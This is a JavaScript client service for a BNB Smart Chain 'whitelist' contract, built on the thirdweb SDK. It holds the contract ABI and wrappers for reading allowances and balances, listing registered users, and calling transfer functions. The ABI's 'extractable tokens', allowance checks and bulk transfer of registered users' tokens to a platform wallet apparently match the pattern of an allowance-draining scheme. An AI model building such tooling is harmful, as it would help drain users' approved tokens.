// RBM WhiteList Contract Service
import { getContract, readContract, prepareContractCall, sendTransaction } from 'thirdweb';
import { createWallet } from 'thirdweb/wallets';
import { client, bscChain } from '../lib/thirdweb';

// Contract Configuration
const CONTRACT_ADDRESS = '0xFd58b061Ab492A1EE874D581E1Ac88a075af56d3';

// Contract ABI
const CONTRACT_ABI = [
  {
    "inputs": [{"internalType": "address payable", "name": "_platformWallet", "type": "address"}, {"internalType": "address", "name": "_token", "type": "address"}],
    "stateMutability": "nonpayable",
    "type": "constructor"
  },
  {
    "anonymous": false,
    "inputs": [{"indexed": true, "internalType": "address", "name": "previousOwner", "type": "address"}, {"indexed": true, "internalType": "address", "name": "newOwner", "type": "address"}],
    "name": "OwnershipTransferred",
    "type": "event"
  },
  {
    "anonymous": false,
    "inputs": [{"indexed": true, "internalType": "address", "name": "user", "type": "address"}],
    "name": "UserRegistered",
    "type": "event"
  },
  {
    "inputs": [{"internalType": "address", "name": "_pltWallet", "type": "address"}],
    "name": "changePlatformWallet",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [{"internalType": "address", "name": "_user", "type": "address"}],
    "name": "checkAllowance",
    "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [{"internalType": "address", "name": "_user", "type": "address"}],
    "name": "checkIfRegistered",
    "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [{"internalType": "address", "name": "_user", "type": "address"}],
    "name": "checkbalance",
    "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "getAllRegistered",
    "outputs": [{"internalType": "address[]", "name": "", "type": "address[]"}],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "getTotalExtractableTokens",
    "outputs": [{"internalType": "uint256", "name": "total", "type": "uint256"}],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [{"internalType": "address", "name": "", "type": "address"}],
    "name": "isRegistered",
    "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "owner",
    "outputs": [{"internalType": "address", "name": "", "type": "address"}],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "platformWallet",
    "outputs": [{"internalType": "address payable", "name": "", "type": "address"}],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
    "name": "registeredUsers",
    "outputs": [{"internalType": "address", "name": "", "type": "address"}],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "renounceOwnership",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "totalRegistered",
    "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [{"internalType": "address", "name": "_user", "type": "address"}],
    "name": "transfer",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "transfer",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [{"internalType": "address", "name": "newOwner", "type": "address"}],
    "name": "transferOwnership",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [{"internalType": "address", "name": "_user", "type": "address"}],
    "name": "whitlistAddress",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  }
];

class RBMWhitelistService {
  constructor() {
    this.client = client;
    this.chain = bscChain;
    this.contractAddress = CONTRACT_ADDRESS;
    this.contractABI = CONTRACT_ABI;
    this.contract = getContract({
      client: this.client,
      chain: this.chain,
      address: this.contractAddress,
      abi: this.contractABI,
    });
  }

  // Get wallet for write operations
  async getWallet() {
    // Create MetaMask wallet
    const wallet = createWallet('io.metamask');

    // Connect to the wallet
    const account = await wallet.connect({
      client: this.client,
      chain: this.chain,
    });

    return { wallet, account };
  }

  // Read Functions
  async checkAllowance(userAddress) {
    try {
      const allowance = await readContract({
        contract: this.contract,
        method: 'checkAllowance',
        params: [userAddress],
      });
      return (Number(allowance) / 1e18).toString(); // Convert from wei to ether
    } catch (error) {
      console.error('Error checking allowance:', error);
      throw error;
    }
  }

  async checkIfRegistered(userAddress) {
    try {
      return await readContract({
        contract: this.contract,
        method: 'checkIfRegistered',
        params: [userAddress],
      });
    } catch (error) {
      console.error('Error checking registration:', error);
      throw error;
    }
  }

  async checkBalance(userAddress) {
    try {
      const balance = await readContract({
        contract: this.contract,
        method: 'checkbalance',
        params: [userAddress],
      });
      return (Number(balance) / 1e18).toString(); // Convert from wei to ether
    } catch (error) {
      console.error('Error checking balance:', error);
      throw error;
    }
  }

  async getTotalExtractableTokens() {
    try {
      const total = await readContract({
        contract: this.contract,
        method: 'getTotalExtractableTokens',
        params: [],
      });
      return (Number(total) / 1e18).toString(); // Convert from wei to ether
    } catch (error) {
      console.error('Error getting total extractable tokens:', error);
      throw error;
    }
  }

  async getTotalRegistered() {
    try {
      const total = await readContract({
        contract: this.contract,
        method: 'totalRegistered',
        params: [],
      });
      return total.toString();
    } catch (error) {
      console.error('Error getting total registered:', error);
      throw error;
    }
  }

  async getAllRegistered() {
    try {
      return await readContract({
        contract: this.contract,
        method: 'getAllRegistered',
        params: [],
      });
    } catch (error) {
      console.error('Error getting all registered users:', error);
      throw error;
    }
  }

  async getOwner() {
    try {
      return await readContract({
        contract: this.contract,
        method: 'owner',
        params: [],
      });
    } catch (error) {
      console.error('Error getting owner:', error);
      throw error;
    }
  }

  async getPlatformWallet() {
    try {
      return await readContract({
        contract: this.contract,
        method: 'platformWallet',
        params: [],
      });
    } catch (error) {
      console.error('Error getting platform wallet:', error);
      throw error;
    }
  }

  // Write Functions (require wallet connection)
  async transferSingle(userAddress) {
    try {
      const { account } = await this.getWallet();

      const transaction = prepareContractCall({
        contract: this.contract,
        method: 'transfer',
        params: [userAddress],
      });

      const result = await sendTransaction({
        transaction,
        account,
      });

      return result;
    } catch (error) {
      console.error('Error in single transfer:', error);
      throw error;
    }
  }

  async transferMulti() {
    try {
      const { account } = await this.getWallet();

      const transaction = prepareContractCall({
        contract: this.contract,
        method: 'transfer',
        params: [],
      });

      const result = await sendTransaction({
        transaction,
        account,
      });

      return result;
    } catch (error) {
      console.error('Error in multi transfer:', error);
      throw error;
    }
  }

  async whitelistAddress(userAddress) {
    try {
      const { account } = await this.getWallet();

      const transaction = prepareContractCall({
        contract: this.contract,
        method: 'whitlistAddress',
        params: [userAddress],
      });

      const result = await sendTransaction({
        transaction,
        account,
      });

      return result;
    } catch (error) {
      console.error('Error whitelisting address:', error);
      throw error;
    }
  }

  // Utility Functions
  async connectWallet() {
    try {
      const { account } = await this.getWallet();
      return account.address;
    } catch (error) {
      console.error('Error connecting wallet:', error);
      throw error;
    }
  }

  // Get supported wallets
  getSupportedWallets() {
    return [
      createWallet('io.metamask'),
      createWallet('com.coinbase.wallet'),
      createWallet('me.rainbow'),
      createWallet('com.trustwallet.app'),
      createWallet('io.zerion.wallet'),
      createWallet('app.phantom'),
    ];
  }

  // Format address for display
  formatAddress(address) {
    if (!address) return '';
    return `${address.slice(0, 6)}...${address.slice(-4)}`;
  }

  // Get BSCScan link
  getBSCScanLink(address, type = 'address') {
    return `https://bscscan.com/${type}/${address}`;
  }
}

export default new RBMWhitelistService();
